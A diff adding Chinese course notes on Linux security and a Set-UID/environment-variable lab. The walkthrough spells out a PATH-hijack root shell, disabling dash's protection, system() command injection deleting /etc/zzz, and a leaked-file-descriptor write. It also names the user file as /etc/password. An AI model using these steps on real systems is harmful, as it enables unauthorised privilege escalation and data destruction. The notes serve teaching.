@@ -1,0 +1,702 @@
+# 主要课程内容
+
+### 一、课程分数占比 (Grading)
+
+- **期末考试 (Final Exams): 40%**
+- **实验与测验 (Labs and Quizzes): 60%**
+    - 实验报告 (Lab reports)
+    - 实验测验 (Lab Quizzes) - 开卷，但不能使用电脑
+- **迟交政策 (Late policy):** 仅适用于实验报告，每迟交一个工作日 (business day)扣分 **10%**。
+
+---
+
+### 二、 Linux 安全基础
+
+这是理解后续所有软件安全漏洞的基础。
+
+1. **用户与权限核心：**
+    - **身份标识：** 系统中一切操作都基于用户身份 (UID) 和用户组 (GID)。root 用户的 UID 为 0，拥有最高权限。
+    - **关键文件：** 用户信息存储在 /etc/password，用户组信息在 /etc/group。
+    - **核心命令：** id (查看身份)，su (切换用户)，usermod (管理用户组)。
+2. **访问控制模型：**
+    - **传统模型 (UGO)：** 文件权限分为三组：**属主 (User)**、**属组 (Group)**、**其他人 (Other)**。每组都有读(r)、写(w)、执行(x)三种权限。
+    - **默认权限 umask：** umask 值决定了新建文件和目录的默认权限，它是一个“减法”掩码，从基础权限中去掉 umask 设定的权限。
+    - **细粒度控制 (ACL)：** 当 UGO 模型不够用时，使用访问控制列表 (ACL) 可以为特定用户或组单独设置权限。ls -l 中带 + 号表示文件有 ACL 设置。
+3. **提权机制：**
+    - **sudo：** 普通用户执行特权命令的首选方式。通过配置 /etc/sudoers 文件（通常是将用户加入 sudo 组），授权用户临时以 root 身份运行指定命令。**安全实践**是使用 sudo 执行单条命令，而不是切换到永久的 root shell。
+
+### 三、 Set-UID 提权与漏洞
+
+这是课程进入的第一个核心软件漏洞主题。
+
+1. **核心机制：** Set-UID (SUID) 是一个特殊的文件权限位。当一个由 root 拥有的可执行文件设置了 SUID 位，任何普通用户执行它时，该进程的**有效用户ID (EUID) 会变成 root**。
+2. **存在意义：** 解决权限矛盾。例如，普通用户需要修改由 root 拥有和管理的 /etc/shadow 文件来更改自己的密码。passwd 命令就是 root 拥有的 SUID 程序，它以 root 权限运行，从而可以安全地修改密码文件。
+3. **核心风险：** SUID 程序是**权限放大的入口**。如果 SUID 程序本身存在漏洞（如缓冲区溢出、不安全地调用外部命令等），攻击者可以利用这些漏洞，让这个本应只做特定事情的 root 权限进程去执行任意恶意代码（如打开一个 root shell），从而实现从普通用户到 root 的提权。
+
+一定要注意特权→非特权后，后门有没有关上，整体上一些针对Set-UID的攻防考虑可参考下面的图片：
+
+- 用户本身的Inputs很好做检查
+- 环境变量则更重要是注重检查有无system，涉及shell就会和环境变量挂钩
+- 系统输入无法鉴权
+- 假设当前进程的特权态转化，是否强制调整豁口
+
+![image.png](attachment:3814f4df-4aec-4b47-8546-db03f324ab97:image.png)
+
+### *、可实践的关键命令行指令与参数
+
+以下是课程中出现的所有核心命令行工具及其用法，按主题分类。
+
+### 1. 用户与身份管理
+
+- **查看用户身份信息:**
+    
+    ```bash
+    id
+    ```
+    
+    _(示例输出: `uid=1000(seed) gid=1000(seed) groups=1000(seed)`)_
+    
+- **切换用户:**
+    
+    ```bash
+    su [用户名]
+    ```
+    
+    _(示例: `su bob` - 切换到 bob 用户, 需要输入 bob 的密码)_
+    
+- **添加新用户:**
+    
+    ```bash
+    adduser [用户名]
+    ```
+    
+    _(幻灯片中提及此命令，用于创建用户)_
+    
+
+### 2. 用户组管理
+
+- **查看用户所属的所有组:**
+    
+    ```bash
+    groups
+    ```
+    
+- **在文件中查找特定用户组信息:**
+    
+    ```bash
+    grep [用户名] /etc/group
+    ```
+    
+    _(示例: `grep seed /etc/group`)_
+    
+- **创建新用户组:**
+    
+    ```bash
+    sudo groupadd [组名]
+    ```
+    
+    _(示例: `sudo groupadd alpha`)_
+    
+- **将用户添加到用户组:**
+    
+    ```bash
+    sudo usermod -a -G [组名] [用户名]
+    ```
+    
+    - `a` (append): 追加，确保用户不会从其他组中被移除。
+    - `G` (Groups): 指定要添加到的附加组。
+    - _(示例: `sudo usermod -a -G alpha seed` - 将用户 seed 添加到 alpha 组)_
+
+### 3. 文件权限与访问控制
+
+- **查看文件权限 (UGO 模型):**
+    
+    ```bash
+    ls -l [文件名或路径]
+    ```
+    
+    _(用于查看类似 `-rwxr-xr--` 的权限字符串、所有者和所属组)_
+    
+- **管理默认权限掩码:**
+    
+    ```bash
+    umask              # 查看当前的 umask 值 (如: 0022)
+    umask [八进制数值]   # 设置新的 umask 值 (如: umask 0022)
+    ```
+    
+- **创建空文件 (用于测试 umask 效果):**
+    
+    ```bash
+    touch [文件名]
+    ```
+    
+    _(示例: `touch t1`)_
+    
+- **查看文件的访问控制列表 (ACL):**
+    
+    ```bash
+    getfacl [文件名]
+    ```
+    
+- **设置文件的访问控制列表 (ACL):**
+    
+    ```bash
+    setfacl [选项] [规则] [文件名]
+    ```
+    
+    - **选项:**
+        - `m` (modify): 修改或添加 ACL 条目。
+        - `x` (remove): 移除 ACL 条目。
+    - **规则格式:**
+        - `u:<用户名>:<权限>` (例如: `u:alice:r--`)
+        - `g:<组名>:<权限>` (例如: `g:faculty:rw-`)
+    - _(示例: `setfacl -m u:alice:r-- example`)_
+
+### 4. 提权与特权命令
+
+- **获取 Root Shell (多种方式):**
+    
+    ```bash
+    sudo -s
+    sudo bash
+    sudo su
+    ```
+    
+    _(课程建议：不推荐使用 Root Shell，而是用 `sudo` 执行单条命令)_
+    
+- **以 Root 身份执行单条命令:**
+    
+    ```bash
+    sudo [要执行的命令]
+    ```
+    
+    _(示例: `sudo cat /etc/shadow` - 以 root 权限查看普通用户无法读取的密码文件)_
+    
+- **更改用户密码 (Set-UID 程序示例):**
+    
+    ```bash
+    passwd
+    ```
+    
+    _(这是一个典型的 Set-UID 程序，普通用户执行时会临时获得 root 权限来修改 `/etc/shadow` 文件)_
+    
+
+### 四、核心概念讲解：真实用户ID (RUID) vs. 有效用户ID (EUID)
+
+在深入实验之前，必须理解 **Effective User ID (EUID)** 的概念，这张幻灯片是完美的演示。
+
+- **真实用户ID (Real User ID - RUID):** 代表**谁真正启动了这个进程**。这个值在进程生命周期中通常不会改变。在幻灯片的例子中，启动进程的用户是 seed (uid=1000)，所以 RUID 始终是 1000。
+- **有效用户ID (Effective User ID - EUID):** 代表**进程在执行时拥有的权限**。操作系统根据 EUID 来判断进程是否有权访问某个文件或执行某个特权操作。通常，EUID 和 RUID 是相同的。
+
+**Set-UID 机制的核心作用就是：在进程运行时，临时将 EUID 变为程序文件所有者的ID。**
+
+1. **准备阶段 (无 Set-UID):**
+    - `$ cp /bin/id myid`: 用户 `seed` 复制了系统命令 `id` 到当前目录，创建了一个名为 `myid` 的新程序。
+    - `$ sudo chown root myid`: 将 `myid` 的所有者更改为 `root`。
+    - `$ ./myid`: `seed` 用户运行 `myid`。
+    - **结果:** `uid=1000(seed) ...`。此时，RUID 是 `seed`，EUID 也是 `seed`。程序只拥有普通用户的权限，它如实报告了启动它的用户身份。
+2. **提权阶段 (设置 Set-UID):**
+    - `$ sudo chmod 4755 myid`: 这是关键一步。`chmod 4755` 命令中的 `4` 就是**设置 Set-UID 权限位**。现在 `myid` 成了一个 Set-UID 程序，并且它的所有者是 `root`。
+    - `$ ./myid`: `seed` 用户再次运行同一个程序。
+    - **结果:** `uid=1000(seed) ... euid=0(root) ...`。
+        - `uid=1000(seed)`: RUID 没变，依然是启动者 `seed`。
+        - `euid=0(root)`: **EUID 变了！** 因为 `myid` 是一个 Set-UID 程序，操作系统在加载它时，发现它的所有者是 `root`，于是将这个进程的 EUID 设置为 `root` 的ID (0)。
+        - **结论:** 虽然这个进程是由普通用户 `seed` 启动的，但它现在拥有了 `root` 的所有权限。这就是 Set-UID 提权的根本原理。
+
+---
+
+## 五、细化基于 环境变量（动态链接库的覆写） + 外部恶意输入的攻击
+
+# 实验总览与完整操作指南
+
+**实验核心逻辑：** 探索环境变量如何被创建、继承，以及攻击者如何利用 `PATH`、`LD_PRELOAD` 等环境变量来劫持 Set-UID 特权程序的执行流程，从而实现提权。同时，对比 `system()` 和 `execve()` 的安全性，并理解权限泄漏的风险。
+
+![image.png](attachment:9e5480b5-c8dd-45ad-a1ab-9b00559eaead:image.png)
+
+![image.png](attachment:15f2f9b9-6a43-45ba-8800-9bf6b1d10c6b:image.png)
+
+### 任务 1：操作环境变量
+
+**目标:** 熟悉环境变量的查看、设置和取消。
+
+**操作步骤与预期结果:**
+
+1. **查看所有环境变量:**
+    
+    ```bash
+    printenv
+    # 或
+    env
+    
+    ```
+    
+    - **预期结果:** 屏幕上会打印出当前 shell 会话中所有已定义的环境变量及其值，如 `HOME=/home/seed`, `PWD=/home/seed/Labsetup`, `SHELL=/bin/bash` 等。
+2. **设置一个新的环境变量:**
+    
+    ```bash
+    export MY_VAR="hello_world"
+    
+    ```
+    
+    - **预期结果:** 命令执行后没有输出。
+3. **验证环境变量是否设置成功:**
+    
+    ```bash
+    printenv | grep MY_VAR
+    
+    ```
+    
+    - **预期结果:** 输出 `MY_VAR=hello_world`。
+4. **取消设置的环境变量:**
+    
+    ```bash
+    unset MY_VAR
+    
+    ```
+    
+    - **预期结果:** 命令执行后没有输出。再次执行 `printenv | grep MY_VAR` 将不会有任何输出。
+
+### 任务 2：父进程向子进程传递环境变量 (通过 `fork()`)
+
+**目标:** 验证子进程是否会继承父进程的环境变量。
+
+关联程序（`myprintenv.c`）
+
+```cpp
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ; // 声明外部变量，指向环境变量列表
+
+void printenv() {
+    int i = 0;
+    while (environ[i] != NULL) {
+        printf("%s\\n", environ[i]);
+        i++;
+    }
+}
+
+void main() {
+    pid_t childPid;
+    switch(childPid = fork()) {
+        case 0:  /* 子进程 */
+            printf("--- Child Process Environment ---\\n");
+            printenv(); // ①
+            exit(0);
+        default: /* 父进程 */
+            // wait(NULL); // 等待子进程结束，确保输出顺序
+            // printf("--- Parent Process Environment ---\\n");
+            // printenv(); // ②
+            exit(0);
+    }
+}
+```
+
+**操作步骤与预期结果:**
+
+1. **编译并运行初始程序 (子进程打印):**
+    
+    ```bash
+    gcc myprintenv.c -o myprintenv_child
+    ./myprintenv_child > child_env.txt
+    ```
+    
+    - **预期结果:** 程序运行，子进程将其环境打印到 `child_env.txt` 文件中。
+2. **修改代码 (注释①, 取消注释②)，编译并运行 (父进程打印):**
+    
+    ```bash
+    # (编辑 myprintenv.c 文件)
+    gcc myprintenv.c -o myprintenv_parent
+    ./myprintenv_parent > parent_env.txt
+    ```
+    
+    - **预期结果:** 程序运行，父进程将其环境打印到 `parent_env.txt` 文件中。
+3. **比较两个输出文件:**
+    
+    ```bash
+    diff child_env.txt parent_env.txt
+    ```
+    
+    - **预期结果:** `diff` 命令没有任何输出，表明两个文件完全相同。
+    - **结论:** 由 `fork()` 创建的子进程会完整地继承父进程的所有环境变量。
+
+### 任务 3：环境变量与 `execve()`
+
+**目标:** 理解 `execve()` 如何处理环境变量。
+
+```cpp
+#include <unistd.h>
+
+extern char **environ;
+int main()
+{
+  char *argv[2];
+
+  argv[0] = "/usr/bin/env";
+  argv[1] = NULL;
+  execve("/usr/bin/env", argv, NULL);   ①
+
+  return 0;
+}
+```
+
+**操作步骤与预期结果:**
+
+1. **编译并运行初始程序 (env 为 NULL):**
+    
+    ```bash
+    gcc myexecve_null.c -o myexecve_null
+    ./myexecve_null
+    
+    ```
+    
+    - **预期结果:** 程序执行 `/usr/bin/env`，但几乎不打印任何环境变量，因为我们向 `execve()` 的第三个参数传递了 `NULL`。
+2. **修改代码 (使用 `environ`)，编译并运行:**
+    
+    ```bash
+    # (编辑代码，将 NULL 改为 environ)
+    gcc myexecve_environ.c -o myexecve_environ
+    ./myexecve_environ
+    
+    ```
+    
+    - **预期结果:** 程序打印出与当前 shell 完全相同的环境变量列表。
+    - **结论:** 新程序不会自动继承环境变量。`execve()` 的调用者必须通过第三个参数显式地将环境变量传递给新程序。
+
+### 任务 4：环境变量与 `system()`
+
+**目标:** 验证 `system()` 函数会自动传递环境变量。
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+  system("/usr/bin/env");
+  return 0 ;
+}
+```
+
+**操作步骤与预期结果:**
+
+1. **编译并运行程序:**
+    
+    ```bash
+    gcc mysystem.c -o mysystem
+    ./mysystem
+    
+    ```
+    
+    - **预期结果:** 程序打印出完整的环境变量列表。
+    - **结论:** `system()` 是一个高级封装函数，它在内部调用 `/bin/sh` 时，会自动处理环境变量的传递，行为更像 `fork()` + `execve(..., environ)`。
+
+### 任务 5：环境变量与 Set-UID 程序
+
+**目标:** 观察哪些环境变量会被一个 Set-UID 程序继承。
+
+观察一个输出当前进程所有环境变量的程序：
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+int main()
+{
+  int i = 0;
+  while (environ[i] != NULL) {
+    printf("%s\\n", environ[i]);
+    i++;
+  }
+}
+```
+
+**操作步骤与预期结果:**
+
+1. **编译程序，并设置为 Set-UID Root:**
+    
+    ```bash
+    gcc print_env.c -o print_env_suid
+    sudo chown root print_env_suid
+    sudo chmod 4755 print_env_suid
+    
+    ```
+    
+    - **预期结果:** `ls -l print_env_suid` 会显示 `rwsr-xr-x 1 root ...`。
+2. **在普通用户 shell 中设置环境变量并运行程序:**
+    
+    ```bash
+    export ANY_NAME="test_value"
+    export PATH="/tmp:$PATH"
+    export LD_LIBRARY_PATH="/tmp"
+    ./print_env_suid
+    ```
+    
+    - **预期结果 (核心观察):**
+        - `ANY_NAME=test_value` **会被继承**。普通自定义变量可以传递。
+        - `PATH` **可能被重置**为一个安全默认值 (如 `/bin:/usr/bin`)。
+        - `LD_LIBRARY_PATH` (以及其他 `LD_*` 变量) **会被清除**。
+    - **结论:** 出于安全考虑，动态链接器和操作系统内核在加载 Set-UID 程序时，会有选择性地忽略或重置某些危险的环境变量，以防止攻击。
+
+### 任务 6：利用 `PATH` 环境变量攻击 Set-UID 程序
+
+**目标:** 通过控制 `PATH` 环境变量，让 Set-UID 程序执行我们的恶意代码。
+
+**操作步骤与预期结果:**
+
+1. **切换系统 shell 到 `zsh` (绕过 `dash` 的保护):**
+    
+    ```bash
+    sudo ln -sf /bin/zsh /bin/sh
+    
+    ```
+    
+    - **预期结果:** `/bin/sh` 现在指向 `/bin/zsh`。
+2. **编译受害程序并设为 Set-UID Root:**
+    
+    ```c
+    // victim_ls.c
+    #include <stdlib.h>
+    int main() { system("ls"); return 0; }
+    
+    ```
+    
+    ```bash
+    gcc victim_ls.c -o victim_ls
+    sudo chown root victim_ls
+    sudo chmod 4755 victim_ls
+    
+    ```
+    
+3. **准备恶意代码:**
+    
+    ```bash
+    echo "/bin/bash" > ls
+    chmod +x ls
+    
+    ```
+    
+    - **预期结果:** 当前目录下有一个名为 `ls` 的可执行文件，其内容是启动一个 shell。
+4. **修改 `PATH` 并执行攻击:**
+    
+    ```bash
+    export PATH=.:$PATH
+    ./victim_ls
+    
+    ```
+    
+    - **预期结果:** **你将获得一个 root shell！** 提示符会变为 `#`。
+    - **原理解释:** 当 `victim_ls` (以 root 权限运行) 调用 `system("ls")` 时，`zsh` shell 会在 `PATH` 中查找 `ls`。因为我们把 `.` (当前目录) 放在了 `PATH` 的最前面，shell 找到了我们的恶意 `ls` 并执行了它。由于整个进程的 EUID 是 root，我们的恶意 `ls` (即 `/bin/bash`) 也以 root 权限运行。
+    - **恢复:** `sudo ln -sf /bin/dash /bin/sh`
+
+### 任务 7：`LD_PRELOAD` 环境变量与 Set-UID 程序
+
+**目标:** 理解动态链接器如何通过忽略 `LD_PRELOAD` 来保护 Set-UID 程序。
+
+这里我们是准备用自己的共享库劫持标准库
+
+```cpp
+#include <stdio.h>
+void sleep (int s)
+{
+  /* 如果这是由特权程序调用的，
+     你可以在这里造成破坏！ */
+  printf("我不会睡觉！\\n");
+}
+```
+
+**操作步骤与预期结果:**
+
+1. **创建并编译自定义共享库:**
+    
+    ```bash
+    # (mylib.c 内容如实验指南)
+    gcc -fPIC -g -c mylib.c//生成位置无关代码（Position Independent Code）,在生成的可执行文件中包含调试信息,只编译源文件，不进行链接
+    gcc -shared -o libmylib.so.1.0.1 mylib.o -lc//最终目标是生成动态链接库，显式链接libc
+    ```
+    
+2. **编译主程序:**
+    
+    ```bash
+    # (myprog.c 内容如实验指南)
+    gcc myprog.c -o myprog
+    ```
+    
+3. **场景一：普通程序攻击**
+    
+    ```bash
+    export LD_PRELOAD=./libmylib.so.1.0.1
+    ./myprog
+    ```
+    
+    - **预期结果:** 输出 "我不会睡觉！"。我们的自定义 `sleep` 函数成功劫持了标准库函数。
+4. **场景二：Set-UID 程序攻击**
+    
+    ```bash
+    sudo chown root myprog
+    sudo chmod 4755 myprog
+    ./myprog
+    ```
+    
+    - **预期结果:** 程序没有任何输出，只是安静地等待1秒后退出。
+    - **结论:** 尽管 `LD_PRELOAD` 环境变量已设置，但当运行 Set-UID 程序时，动态链接器为了安全会忽略它，因此我们的恶意库没有被加载，程序调用的是正常的 `sleep` 函数。
+
+### 任务 8：`system()` vs `execve()` 的命令注入漏洞
+
+**目标:** 展示 `system()` 如何因为调用 shell 而易受命令注入攻击。
+
+```cpp
+int main(int argc, char *argv[])
+{
+  char *v[3];
+  char *command;
+
+  if(argc < 2) {
+    printf("Please type a file name.\\n");
+    return 1;
+  }
+
+  v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
+  command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
+  sprintf(command, "%s %s", v[0], v[1]);
+
+  // 仅使用以下两种方法之一。
+  system(command);
+  // execve(v[0], v, NULL);
+
+  return 0 ;
+}
+```
+
+**操作步骤与预期结果:**
+
+1. **创建并编译使用 `system()` 的程序，并设为 Set-UID Root:**
+    
+    ```bash
+    # (victim_cat_system.c 内容如实验指南)
+    gcc victim_cat_system.c -o victim_cat_system
+    sudo chown root victim_cat_system
+    sudo chmod 4755 victim_cat_system
+    sudo touch /etc/zzz # 创建一个用于删除的目标文件
+    
+    ```
+    
+2. **执行命令注入攻击:**
+    
+    ```bash
+    ./victim_cat_system "anyfile; rm /etc/zzz"
+    
+    ```
+    
+    - **预期结果:** `cat` 可能会报错说找不到文件 "anyfile"，但随后 `/etc/zzz` 文件被删除了！
+    - **原理解释:** `system()` 将整个字符串传递给 shell。shell 看到分号 `;`，把它解释为命令分隔符，于是先执行 `cat anyfile`，再执行 `rm /etc/zzz`。因为程序是 Set-UID root，`rm` 命令也以 root 权限执行。
+3. **修改为 `execve()`，重新编译并测试:**
+    
+    ```bash
+    # (修改代码，使用 execve() 分支)
+    gcc victim_cat_execve.c -o victim_cat_execve
+    sudo chown root victim_cat_execve
+    sudo chmod 4755 victim_cat_execve
+    # (重新创建 /etc/zzz)
+    ./victim_cat_execve "anyfile; rm /etc/zzz"
+    
+    ```
+    
+    - **预期结果:** `cat` 报错，提示找不到名为 `"anyfile; rm /etc/zzz"` 的文件。`/etc/zzz` 文件**没有被删除**。
+    - **结论:** `execve()` 不经过 shell 解析。它将整个 `"anyfile; rm /etc/zzz"` 字符串视为一个单一的文件名参数，所以攻击失败。**在处理外部输入时，`execve()` 远比 `system()` 安全。**
+
+### 任务 9：权限泄漏漏洞
+
+```cpp
+void main()
+{
+  int fd;
+  char *v[2];
+
+  /* 假设 /etc/zzz 是一个重要的系统文件，
+   * 并且它的所有者是 root，权限是 0644。
+   * 在运行此程序之前，你应先创建 /etc/zzz 文件。 */
+  fd = open("/etc/zzz", O_RDWR | O_APPEND);
+  if (fd == -1) {
+     printf("Cannot open /etc/zzz\\n");
+     exit(0);
+  }
+
+  // 打印文件描述符值
+  printf("fd is %d\\n", fd);
+
+  // 通过将有效 uid 设置为与实际 uid 相同来永久放弃特权
+  setuid(getuid());
+
+  // 执行 /bin/sh
+  v[0] = "/bin/sh"; v[1] = 0;
+  execve(v[0], v, 0);
+}
+```
+
+**目标:** 利用程序在放弃权限后未关闭的特权资源（文件描述符）。
+
+**操作步骤与预期结果:**
+
+1. **准备环境并编译程序:**
+    
+    ```bash
+    sudo touch /etc/zzz
+    sudo chmod 644 /etc/zzz
+    # (victim_leak.c 内容如实验指南)
+    gcc victim_leak.c -o victim_leak
+    sudo chown root victim_leak
+    sudo chmod 4755 victim_leak
+    ```
+    
+2. **运行程序并发起攻击:**
+    
+    ```bash
+    ./victim_leak
+    ```
+    
+    - **预期结果:**
+        
+        1. 程序打印 `fd is 3` (或其他数字)。
+            
+        2. 你被放入一个普通用户的 shell (`$`)。
+            
+        3. 在这个新的 shell 中，执行以下命令：
+            
+            ```bash
+            echo "Leaked privilege" >&3
+            # 这里的 3 必须与上面程序打印的 fd 号码一致
+            exit
+            
+            ```
+            
+        4. 退出后，检查文件内容：
+            
+            ```bash
+            cat /etc/zzz
+            
+            ```
+            
+    - **最终结果:** `/etc/zzz` 文件的内容现在是 "Leaked privilege"。
+        
+    - **结论:** 尽管程序通过 `setuid(getuid())` 放弃了 root 权限，但它之前以 root 权限打开的 `/etc/zzz` 文件的**文件描述符 (fd=3)** 仍然是有效的，并被子进程 (新 shell) 继承。我们利用这个“泄漏”的句柄，成功地以普通用户身份写入了一个 root 拥有的文件。
+        
+
+### 幻灯片实操逻辑分析：
+
+这张图分两步展示了 Set-UID 如何改变一个进程的权限：
+
+1. **准备阶段 (无 Set-UID):**
+    - $ cp /bin/id myid: 用户 seed 复制了系统命令 id 到当前目录，创建了一个名为 myid 的新程序。
+    - $ sudo chown root myid: 将 myid 的所有者更改为 root。
+    - $ ./myid: seed 用户运行 myid。
+    - **结果:** uid=1000(seed) ...。此时，RUID 是 seed，EUID 也是 seed。程序只拥有普通用户的权限，它如实报告了启动它的用户身份。
+2. **提权阶段 (设置 Set-UID):**
+    - $ sudo chmod 4755 myid: 这是关键一步。chmod 4755 命令中的 4 就是**设置 Set-UID 权限位**。现在 myid 成了一个 Set-UID 程序，并且它的所有者是 root。（后面的755分别代表拥有者，所属组和其他用户的rwx权限）
+    - $ ./myid: seed 用户再次运行同一个程序。
+    - **结果:** uid=1000(seed) ... euid=0(root) ...。
+        - uid=1000(seed): RUID 没变，依然是启动者 seed。
+        - euid=0(root): **EUID 变了！** 因为 myid 是一个 Set-UID 程序，操作系统在加载它时，发现它的所有者是 root，于是将这个进程的 EUID 设置为 root 的ID (0)。
+        - **结论:** 虽然这个进程是由普通用户 seed 启动的，但它现在拥有了 root 的所有权限。这就是 Set-UID 提权的根本原理。
